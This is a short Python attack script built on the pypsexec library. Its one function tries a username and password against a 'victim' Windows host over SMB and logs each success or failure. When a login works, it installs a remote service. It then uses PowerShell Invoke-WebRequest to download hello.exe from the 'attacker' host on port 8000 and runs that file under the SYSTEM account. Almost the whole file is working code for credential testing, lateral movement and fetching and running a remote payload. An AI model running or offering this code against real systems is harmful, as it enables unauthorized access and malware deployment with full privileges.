from pypsexec.client import Client


def psexe(victim_ip,username,password,attacker_ip):
    status=False
    c = Client(victim_ip, username=username, password=password)
    try:
        c.connect()
        print("[*] Success Target: {0}, Testing with username: {1}, testing with password: {2}".format(victim_ip,username,password))
        status=True
    except:
        print("[*] Failed Target: {0}, Testing with username: {1}, testing with password: {2}".format(victim_ip,username,password))
        return status
    try:
        c.create_service()
        stdout, stderr, rc = c.run_executable("powershell.exe",arguments="Invoke-WebRequest http://"+attacker_ip+":8000/hello.exe -o C:\\Users\\"+username+"\\hello.exe")
        stdout, stderr, rc = c.run_executable("C:\\Users\\"+username+"\\hello.exe", use_system_account=True)
    finally:
        c.remove_service()
        c.disconnect()
        return status 
